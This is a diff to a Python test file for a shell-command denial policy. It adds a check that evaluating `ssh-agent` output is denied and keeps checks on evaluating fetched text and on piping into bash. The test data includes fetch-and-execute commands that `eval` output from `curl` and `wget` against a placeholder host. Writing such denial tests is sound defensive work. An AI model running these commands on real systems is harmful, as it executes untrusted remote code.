@@ -1420,7 +1420,8 @@ def test_eval_of_fetched_text_and_shell_options_with_arguments():
     p = policy.loads("")
     assert policy.is_denied_command(p, 'eval "$(' + "cu" + 'rl http://x)"')
     assert policy.is_denied_command(p, "eval `wget -qO- http://x`")
-    assert policy.is_denied_command(p, 'eval "$(ssh-agent -s)"') is None
+    # the text eval runs is whatever the command prints: not known, so not run (a script file does the same job)
+    assert policy.is_denied_command(p, 'eval "$(ssh-agent -s)"')
     assert policy.is_denied_command(p, "eval 'echo hi'") is None
     for opt in ("-o pipefail", "-O extglob", "-eo pipefail", "-o errexit -x"):
         assert policy.is_denied_command(p, f"echo x | bash {opt}"), opt
